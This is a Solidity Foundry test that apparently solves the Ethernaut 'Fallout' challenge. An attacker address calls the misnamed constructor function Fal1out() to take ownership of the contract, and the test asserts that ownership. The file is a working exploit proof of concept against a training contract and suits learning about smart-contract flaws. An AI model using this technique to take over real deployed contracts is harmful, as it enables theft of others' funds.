// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutExploitTest is Test {
    Fallout public target;
    address constant OWNER = address(0xCAFE);
    address constant ATTACKER = address(0xBEEF);

    function setUp() public {
        vm.prank(OWNER);
        target = new Fallout();

        vm.deal(ATTACKER, 1 ether); 
    }

    function testExploit() public {
        vm.startPrank(ATTACKER);
        // Step 1: Call the misnamed constructor to become the owner
        target.Fal1out();
        // Are we owner
        assertEq(target.owner(), ATTACKER, "Attacker is not the owner");
        vm.stopPrank();
        // GG
    }
}